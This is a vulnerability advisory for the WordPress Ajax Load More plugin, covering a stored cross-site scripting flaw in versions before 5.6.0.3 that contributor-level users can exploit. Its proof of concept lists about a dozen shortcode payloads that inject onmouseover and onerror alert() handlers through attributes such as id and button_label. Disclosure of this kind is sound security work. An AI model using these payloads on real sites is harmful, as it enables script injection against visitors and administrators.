## WordPress Plugin Vulnerabilities

# WordPress Infinite Scroll - Ajax Load More < 5.6.0.3 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

Examples (a lot of attributes are affected!, not just the ones below)
v < 5.6.0.3
[ajax\_load\_more id='" onmouseover="alert(/XSS-id-1/)"']
[ajax\_load\_more id='2" src onerror=alert(/XSSid-2/)//']
[ajax\_load\_more id='a = 1;alert(/XSSid-3/); var b']
[ajax\_load\_more button\_label='"onmouseover=alert(/XSS-button\_label/)//']
[ajax\_load\_more button\_loading\_label='"onmouseover=alert(/XSS-button\_loading\_label/)//']
[ajax\_load\_more button\_done\_label='"onmouseover=alert(/XSS-button\_done\_label/)//']
v < 5.6.0.1
[ajax\_load\_more max\_pages='"onmouseover=alert(/XSS-max\_pages/)//']
v < 5.6.0
[ajax\_load\_more repeater='" onmouseover="alert(/XSS/)"']
[ajax\_load\_more theme\_repeater='" onmouseover="alert(/XSS/)"']
[ajax\_load\_more tag='" onmouseover="alert(/XSS/)"']
v < 5.5.5 (original from submitter)
[ajax\_load\_more css\_classes='" onmouseover="alert(/XSS/)"']
